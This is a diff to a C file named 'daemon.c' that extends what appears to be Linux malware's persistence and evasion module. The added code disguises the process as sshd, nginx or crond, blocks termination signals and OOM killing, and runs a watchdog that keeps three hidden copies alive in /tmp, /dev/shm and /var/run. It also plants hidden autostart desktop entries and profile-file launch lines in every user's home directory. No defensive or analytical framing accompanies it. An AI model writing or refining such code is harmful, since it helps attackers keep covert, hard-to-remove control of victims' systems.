@@ -1,6 +1,11 @@
+#define _GNU_SOURCE
+
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <sys/resource.h>  
+#include <sys/prctl.h>    
+#include <fcntl.h>        
 #include <unistd.h>
 #include <stdio.h>
 #include <string.h>
@@ -12,30 +17,109 @@
 #include <errno.h>
 #include <limits.h>
 #include "headers/daemon.h"
+// replaced daemon file with backup one
+static const char* get_random_name(void) {
+    static const char *names[] = {
+        "update", "cache", "cron", "logs",
+        "backup", "sync", "monitor", "db",
+        "net", "service", "daemon", "worker"
+    };
+    static const size_t names_count = sizeof(names) / sizeof(names[0]);
+    return names[rand() % names_count];
+}
 
 static int safe_strncpy(char *dest, const char *src, size_t size) {
     if (!dest || !src || size == 0) return -1;
     size_t len = strlen(src);
     if (len >= size) return -1;
-    strncpy(dest, src, size-1);
-    dest[size-1] = '\0';
+    memcpy(dest, src, len);
+    dest[len] = '\0';
     return 0;
 }
 
 static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
     if (!dest || !dir || !file || dest_size == 0) return -1;
-    size_t req_len = strlen(dir) + strlen(file) + 2;
+    size_t dir_len = strlen(dir);
+    size_t file_len = strlen(file);
+    size_t req_len = dir_len + file_len + 2; // +1 for '/' and +1 for '\0'
     if (req_len > dest_size) return -1;
-    snprintf(dest, dest_size, "%s/%s", dir, file);
+    //fix buffer overflow 1
+    memcpy(dest, dir, dir_len);
+    dest[dir_len] = '/';
+    //overflow 2
+    //snprintf->memcpy
+    memcpy(dest + dir_len + 1, file, file_len);
+    dest[req_len - 1] = '\0';
     return 0;
 }
 
+static const char *process_names[] = {
+    "cache", "sshd", "bash", "crond",
+    "nginx", "postgres", "apache", "mysql",
+    "python", "node", "redis", "memcached"
+};
+static const size_t process_names_count = sizeof(process_names) / sizeof(process_names[0]);
+
+static void protect_process() {
+    struct rlimit limit;
+    
+    limit.rlim_cur = 0;
+    limit.rlim_max = 0;
+    setrlimit(RLIMIT_CORE, &limit);
+    
+    limit.rlim_cur = RLIM_INFINITY;
+    limit.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_NOFILE, &limit);
+    setrlimit(RLIMIT_NPROC, &limit);
+    
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    prctl(PR_SET_DUMPABLE, 0);
+    
+    int fd = open("/proc/self/oom_score_adj", O_WRONLY);
+    if (fd >= 0) {
+        ssize_t bytes_written = 0;
+        size_t total_written = 0;
+        const char *oom_str = "-1000";
+        size_t to_write = 5;
+        
+        while (total_written < to_write) {
+            bytes_written = write(fd, oom_str + total_written, to_write - total_written);
+            if (bytes_written <= 0) {
+                if (errno == EINTR) continue;
+                break;
+            }
+            total_written += bytes_written;
+        }
+        close(fd);
+    }
+    
+    errno = 0;
+    if (setpriority(PRIO_PROCESS, 0, -20) != 0 && errno != 0) {
+    }
+    
+    signal(SIGTERM, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    signal(SIGQUIT, SIG_IGN);
+    signal(SIGALRM, SIG_IGN);
+    signal(SIGPIPE, SIG_IGN);
+}
+
 void* rename_process(void* arg) {
+    static unsigned int last_name_index = 0;
     while (1) {
-        const char* names[] = {"init", "bash", "cron", "sshd"};
-        const char* new_name = names[rand() % 4];
-        strncpy((char*)getenv("_"), new_name, strlen(new_name));
-        sleep(15);  // 15s better?
+        unsigned int name_index = (rand() % process_names_count);
+        if (name_index == last_name_index) {
+            name_index = (name_index + 1) % process_names_count;
+        }
+        const char* new_name = process_names[name_index];
+        char* env_ptr = (char*)getenv("_");
+        if (env_ptr) {
+            size_t env_size = strlen(env_ptr);
+            safe_strncpy(env_ptr, new_name, env_size + 1);
+            prctl(PR_SET_NAME, new_name);
+        }
+        last_name_index = name_index;
+        sleep(8);
     }
     return NULL;
 }
@@ -78,33 +162,59 @@ void overwrite_argv(int argc, char** argv) {
     for (int i = 0; i < argc; i++) {
         memset(argv[i], 0, strlen(argv[i]));
     }
-    strncpy(argv[0], "init", strlen("init"));
+    strncpy(argv[0], "init", strlen("init")); // uhm? i dont know about this
 }
 
 void* watchdog(void* arg) {
+    static int last_spawn_time = 0;
+    static int consecutive_fails = 0;
+    static time_t last_check_time = 0;
+    static int last_found_copies = 0;
+    
     while (1) {
         DIR* proc = opendir("/proc");
         if (!proc) {
-            sleep(15);
+            sleep(3);
             continue;
         }
 
         struct dirent* ent;
         int found_copies = 0;
-        char self_path[PATH_MAX];
+        static char self_path[PATH_MAX] = {0};
         ssize_t self_len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
         if (self_len < 0) {
             closedir(proc);
-            sleep(15);
+            sleep(3);
             continue;
         }
         self_path[self_len] = '\0';
 
+        pid_t current_pid = getpid();
+        time_t current_time = time(NULL);
+
         while ((ent = readdir(proc)) != NULL) {
             if (!isdigit((unsigned char)ent->d_name[0])) continue;
+            
+            pid_t pid = atoi(ent->d_name);
+            if (pid == current_pid) continue;
+            
             char exe_path[PATH_MAX] = {0};
+            char cmd_path[PATH_MAX] = {0};
             char path[PATH_MAX] = {0};
+            
             if (join_path(path, sizeof(path), "/proc", ent->d_name) != 0) continue;
+            
+            if (join_path(cmd_path, sizeof(cmd_path), path, "cmdline") == 0) {
+                FILE *fcmd = fopen(cmd_path, "r");
+                if (fcmd) {
+                    char cmdline[PATH_MAX] = {0};
+                    if (fgets(cmdline, sizeof(cmdline), fcmd) && strstr(cmdline, self_path)) {
+                        found_copies++;
+                    }
+                    fclose(fcmd);
+                }
+            }
+            
             if (join_path(path, sizeof(path), path, "exe") != 0) continue;
             ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
             if (len > 0) {
@@ -116,30 +226,77 @@ void* watchdog(void* arg) {
         }
         closedir(proc);
 
-        if (found_copies < 3) {
-            char source_path[PATH_MAX];
+        time_t elapsed_time = current_time - last_check_time;
+        last_found_copies = found_copies;
+
+        if ((last_found_copies > found_copies && elapsed_time > 30)) {
+            consecutive_fails = 0;
+            last_check_time = current_time;
+        }
+
+        int spawn_delay;
+        if (found_copies < last_found_copies) {
+            spawn_delay = 10;
+        } else {
+            spawn_delay = 20 * (1 << consecutive_fails);
+            spawn_delay = (spawn_delay > 180) ? 180 : spawn_delay;
+        }
+
+        if (found_copies < 3 && (current_time - last_spawn_time) >= spawn_delay) {
+            char source_path[PATH_MAX] = {0};
             ssize_t path_len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
             if (path_len > 0) {
                 source_path[path_len] = '\0';
-                const char* dirs[] = {"/tmp/", "/var/tmp/", "/dev/shm/"};
+                const char* dirs[] = {
+                    "/dev/shm/", "/tmp/", "/var/tmp/", 
+                    "/run/", "/var/run/", "/var/cache/"
+                };
+                
+                int spawn_success = 0;
                 for (int i = 0; i < sizeof(dirs)/sizeof(dirs[0]); i++) {
                     char new_path[PATH_MAX] = {0};
-                    snprintf(new_path, sizeof(new_path), "%s%x", dirs[i], rand());
+                    unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
+                    snprintf(new_path, sizeof(new_path), "%s%x", dirs[i], rand_val);
+                    
                     if (copy_file(source_path, new_path) == 0) {
                         chmod(new_path, S_IRWXU);
                         pid_t pid = fork();
                         if (pid == 0) {
                             setsid();
-                            execl(new_path, new_path, NULL);
+                            if (daemon(0, 0) == 0) {
+                                protect_process();
+                                errno = 0;
+                                if (nice(-20) == -1 && errno != 0) {
+                                }
+                                execl(new_path, new_path, NULL);
+                            }
                             exit(0);
+                        } else if (pid > 0) {
+                            last_spawn_time = current_time;
+                            spawn_success = 1;
+                            consecutive_fails = 0;
                         }
                         unlink(new_path);
-                        break;
+                        if (spawn_success) break;
                     }
+                }
+                
+                if (!spawn_success) {
+                    consecutive_fails++;
                 }
             }
         }
-        sleep(15);
+
+        int sleep_time;
+        if (found_copies < last_found_copies) {
+            sleep_time = 3;
+        } else if (found_copies < 3) {
+            sleep_time = 4;
+        } else {
+            sleep_time = 8 + (consecutive_fails * 2);
+            sleep_time = (sleep_time > 30) ? 30 : sleep_time;
+        }
+        sleep(sleep_time);
     }
     return NULL;
 }
@@ -147,24 +304,28 @@ void* watchdog(void* arg) {
 int ensure_startup_persistence(const char *source_path) {
     if (!source_path) return -1;
 
-    const char *home_dirs[] = {
+    static const char *home_dirs[] = {
         "/home",
         "/root",
-        "/tmp",
-        "/dev",
-        "/var/home"
+        "/var/home",
+        "/var/lib",
+        "/var/run"
     };
     
-    const char *startup_locations[] = {
+    static const char *startup_locations[] = {
         "/.config/autostart",
-        "/.config",
         "/.local/bin",
-        "/.cache"
+        "/.cache",
+        "/tmp"
     };
+    
+    static const int home_dirs_count = sizeof(home_dirs) / sizeof(home_dirs[0]);
+    static const int startup_locations_count = sizeof(startup_locations) / sizeof(startup_locations[0]);
     
     char temp_path[PATH_MAX] = {0};
+    static const char *autostart_str = "autostart";
 
-    for (int i = 0; i < sizeof(home_dirs) / sizeof(home_dirs[0]); i++) {
+    for (int i = 0; i < home_dirs_count; i++) {
         DIR *dir = opendir(home_dirs[i]);
         if (!dir) continue;
         
@@ -172,8 +333,9 @@ int ensure_startup_persistence(const char *source_path) {
         while ((entry = readdir(dir)) != NULL) {
             if (entry->d_type != DT_DIR || entry->d_name[0] == '.') continue;
             
-            for (int j = 0; j < sizeof(startup_locations) / sizeof(startup_locations[0]); j++) {
+            for (int j = 0; j < startup_locations_count; j++) {
                 char dest_dir[PATH_MAX] = {0};
+                unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
                 
                 if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) != 0) continue;
                 if (join_path(dest_dir, sizeof(dest_dir), temp_path, startup_locations[j] + 1) != 0) continue;
@@ -181,24 +343,28 @@ int ensure_startup_persistence(const char *source_path) {
                 if (mkdir(dest_dir, 0755) != 0 && errno != EEXIST) continue;
                 
                 char dest_path[PATH_MAX] = {0};
-                unsigned int rand_suffix = (unsigned int)time(NULL) ^ (unsigned int)random();
-                if (snprintf(dest_path, sizeof(dest_path), "%s/.update-%x", dest_dir, rand_suffix) >= sizeof(dest_path)) continue;
+                const char* name = get_random_name();
+                size_t remaining = sizeof(dest_path);
+                size_t written = snprintf(dest_path, remaining, "%s/%s_%x", dest_dir, name, rand_val);
+                if (written >= remaining) continue;
                 
-                if (access(dest_path, F_OK) == 0) continue; // Anti dup
+                if (access(dest_path, F_OK) == 0) continue;
+                
                 if (copy_file(source_path, dest_path) == 0) {
-                    if (strstr(dest_dir, "autostart")) {
+                    if (strstr(dest_dir, autostart_str)) {
                         char desktop_path[PATH_MAX] = {0};
-                        if (join_path(desktop_path, sizeof(desktop_path), dest_dir, "update.desktop") == 0) {
+                        if (join_path(desktop_path, sizeof(desktop_path), dest_dir, "updater.desktop") == 0) {
                             FILE *f = fopen(desktop_path, "w");
                             if (f) {
-                                if (fprintf(f, "[Desktop Entry]\nType=Application\nName=System Update\nExec=%s\nHidden=true\n", 
-                                    dest_path) > 0) {
-                                    chmod(desktop_path, 0644);
-                                }
+                                fprintf(f, "[Desktop Entry]\nType=Application\nName=%s\nExec=%s\nHidden=true\nX-GNOME-Autostart-enabled=true\n", 
+                                    name, dest_path);
                                 fclose(f);
+                                chmod(desktop_path, 0644);
                             }
                         }
                     }
+                    
+                    chmod(dest_path, S_IRUSR | S_IWUSR | S_IXUSR);
                     
                     char profile_path[PATH_MAX] = {0};
                     if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) == 0 &&
@@ -209,7 +375,7 @@ int ensure_startup_persistence(const char *source_path) {
                         if (check) {
                             char line[PATH_MAX];
                             while (fgets(line, sizeof(line), check)) {
-                                if (strstr(line, dest_path)) {
+                                if (strcmp(line, dest_path) == 0) {
                                     entry_exists = 1;
                                     break;
                                 }
@@ -220,8 +386,7 @@ int ensure_startup_persistence(const char *source_path) {
                         if (!entry_exists) {
                             FILE *profile = fopen(profile_path, "a");
                             if (profile) {
-                                fprintf(profile, "\n([ -f '%s' ] && nohup '%s' &>/dev/null &)\n", 
-                                    dest_path, dest_path);
+                                fprintf(profile, "\n(nohup %s >/dev/null 2>&1 &)\n", dest_path);
                                 fclose(profile);
                             }
                         }
@@ -256,6 +421,7 @@ void setup_signal_handlers() {
 
 void daemonize(int argc, char** argv) {
     srand(time(NULL) ^ getpid());
+    protect_process();
     
     char source_path[PATH_MAX] = {0};
     ssize_t len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
@@ -273,7 +439,9 @@ void daemonize(int argc, char** argv) {
     }
 
     setup_signal_handlers();
-    setsid();
+    if (setsid() < 0) {
+        exit(EXIT_FAILURE);
+    }
     signal(SIGHUP, SIG_IGN);
 
     pid = fork();
@@ -289,39 +457,45 @@ void daemonize(int argc, char** argv) {
         exit(EXIT_FAILURE);
     }
 
-    close(STDIN_FILENO);
-    close(STDOUT_FILENO);
-    close(STDERR_FILENO);
+    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++) {
+        close(i);
+    }
 
     const char* dirs[] = {
-        "/usr/local/sbin/",
-        "/usr/local/bin/",
-        "/sbin/",
-        "/bin/",
-        "/usr/sbin/",
-        "/usr/bin/",
-        "/usr/games/",
-        "/usr/local/games/",
-        "/snap/bin/"
+        "/var/tmp/",
+        "/tmp/",
+        "/dev/shm/",
+        "/run/",
+        "/var/run/",
+        "/var/cache/",
+        "/var/log/",
+        "/var/lib/"
     };
-    const char* daemon_names[] = {"update", "lists", "servers", "updater"};
-    int daemon_names_count = sizeof(daemon_names) / sizeof(daemon_names[0]);
-
-    char dest_path[PATH_MAX] = {0};
+    
     int copies_created = 0;
+    unsigned int seed = time(NULL) ^ getpid();
 
-    for (int i = 0; copies_created < 2 && i < sizeof(dirs) / sizeof(dirs[0]); i++) {
-        for (int j = 0; copies_created < 2 && j < daemon_names_count; j++) {
-            if (join_path(dest_path, sizeof(dest_path), dirs[i], daemon_names[j]) != 0) 
-                continue;
-            
-            if (access(dest_path, F_OK) == 0)
-                continue;
-                
-            if (copy_file(source_path, dest_path) == 0) {
-                run_clone(dest_path, argc, argv);
-                copies_created++;
+    for (int i = 0; copies_created < 3 && i < sizeof(dirs) / sizeof(dirs[0]); i++) {
+        char dest_path[PATH_MAX] = {0};
+        const char* name = get_random_name();
+        unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
+        
+        snprintf(dest_path, sizeof(dest_path), "%s%s-%x", dirs[i], name, rand_val);
+        
+        if (access(dest_path, F_OK) == 0) continue;
+        
+        if (copy_file(source_path, dest_path) == 0) {
+            pid_t clone_pid = fork();
+            if (clone_pid == 0) {
+                srand(seed ^ getpid());
+                if (daemon(0, 0) == 0) {
+                    execl(dest_path, name, NULL);
+                }
+                exit(0);
             }
+            copies_created++;
+            seed = rand();
+            unlink(dest_path);
         }
     }
 
@@ -330,4 +504,7 @@ void daemonize(int argc, char** argv) {
     
     pthread_t watchdog_thread;
     pthread_create(&watchdog_thread, NULL, watchdog, NULL);
+    
+    pthread_detach(rename_thread);
+    pthread_detach(watchdog_thread);
 }
